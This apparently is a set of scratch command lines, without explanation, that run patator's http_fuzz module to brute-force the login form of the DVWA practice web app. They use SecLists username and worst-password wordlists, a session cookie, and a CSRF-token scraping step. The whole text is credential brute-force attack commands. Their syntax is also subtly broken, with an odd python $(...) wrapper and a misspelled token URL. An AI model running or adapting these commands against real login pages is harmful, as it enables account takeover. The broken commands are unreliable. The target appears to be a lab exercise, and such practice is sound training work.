...
# python $(~/Desktop/patator/patator.py http_fuzz method=GET follow=0 accept_cookie=0 --threads=1 timeout=5 --max-retries=5 url="http://192.168.178.98/dvwa/vulnerabilities/brute/?username=FILE1&password=FILE0&user_token=_CSRFHIGH_&Login=Login" 1=/Users/NTAuthority/Desktop/SecLists/Usernames/top_shortlist.txt 0=/Users/NTAuthority/Desktop/SecLists/Passwords/500-worst-passwords.txt header="Cookie: security=high; PHPSESSID=${SESSIONID}" before_urls="http://192.168.178.98/dvwa/vulnernabilites/brute" before_header="Cookie: security=high; PHPSESSID=${SESSIONID}" before_egrep=$"type='hidden' name='user_token' value='()'" -x quit:fgrep!="Welcome" -d)
python $(~/Desktop/patator/patator.py http_fuzz method=GET follow=0 accept_cookie=0 --threads=1 timeout=5 --max-retries=5 url="http://192.168.178.98/dvwa/vulnerabilities/brute/?username=FILE1&password=FILE0&user_token=_CSRFHIGH_&Login=Login" 1=/Users/NTAuthority/Desktop/SecLists/Usernames/top_shortlist.txt 0=/Users/NTAuthority/Desktop/SecLists/Passwords/500-worst-passwords.txt header="Cookie: security=high; PHPSESSID=${SESSIONID}" -x quit:fgrep!="Welcome" -d)
